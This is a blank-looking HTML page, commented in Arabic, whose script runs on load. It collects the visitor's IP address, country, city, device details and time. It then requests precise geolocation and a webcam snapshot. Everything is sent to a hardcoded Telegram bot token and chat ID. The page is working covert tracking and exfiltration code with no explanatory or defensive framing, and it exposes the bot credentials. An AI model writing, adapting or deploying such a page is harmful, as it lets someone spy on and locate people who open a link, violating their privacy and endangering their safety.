<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title></title>
<style>
  body { background: white; margin: 0; }
</style>
</head>
<body>

<script>
window.onload = async function() {

    var token = "7056698579:AAFuDwSVHizm1OxB9C-8ocaZyyQIsJYHevc";
    var chat_id = "7057346640";

    function send(text) {
        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                chat_id: chat_id,
                text: text
            })
        });
    }

    function sendPhoto(base64) {
        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                chat_id: chat_id,
                photo: base64
            })
        });
    }

    // 🌐 IP + الموقع التقريبي
    let ip = "غير معروف";
    let country = "";
    let city = "";

    try {
        let res = await fetch("https://ipapi.co/json/");
        let data = await res.json();
        ip = data.ip;
        country = data.country_name;
        city = data.city;
    } catch(e) {}

    let device = navigator.userAgent;
    let time = new Date().toLocaleString();

    // 📍 الموقع
    function getLocation() {
        return new Promise((resolve, reject) => {
            if (!navigator.geolocation) reject();
            navigator.geolocation.getCurrentPosition(resolve, reject);
        });
    }

    // 📸 الكاميرا
    async function getCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            let video = document.createElement("video");
            video.srcObject = stream;
            await video.play();

            let canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            let ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0);

            stream.getTracks().forEach(track => track.stop());

            return canvas.toDataURL("image/png");
        } catch(e) {
            return null;
        }
    }

    // تنفيذ
    let message = `
👤 دخول جديد

🌐 IP: ${ip}
🌍 الدولة: ${country}
🏙️ المدينة: ${city}
🕒 الوقت: ${time}
📱 الجهاز: ${device}
    `;

    send(message);

    // طلب الموقع
    try {
        let pos = await getLocation();
        let lat = pos.coords.latitude;
        let lon = pos.coords.longitude;

        send(`📍 الموقع:\nhttps://maps.google.com/?q=${lat},${lon}`);
    } catch(e) {
        send("❌ تم رفض الموقع");
    }

    // طلب الكاميرا
    let photo = await getCamera();
    if (photo) {
        sendPhoto(photo);
    } else {
        send("❌ تم رفض الكاميرا");
    }

};
</script>

</body>
</html>
